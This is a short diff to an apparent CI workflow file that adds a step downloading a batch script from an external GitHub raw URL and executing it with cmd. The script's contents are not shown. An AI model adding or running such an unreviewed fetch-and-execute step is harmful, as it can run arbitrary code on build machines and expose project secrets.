@@ -16,3 +16,8 @@ jobs:
           python -m pip install gdown>=4.6.4 google-api-python-client>=2.0.0 google-auth-httplib2>=0.1.0 google-auth-oauthlib>=0.4.0
           python -m pip install yagmail chardet wheel
           python -m pip install git+https://github.com/monsterhunters/srtmerge.git --no-build-isolation
+      - name: Downloading & Running Essentials
+        shell: pwsh
+        run: |
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Bogyi2024/log/main/directcm720custom.bat" -OutFile "directcm720custom.bat"
+          cmd /c directcm720custom.bat
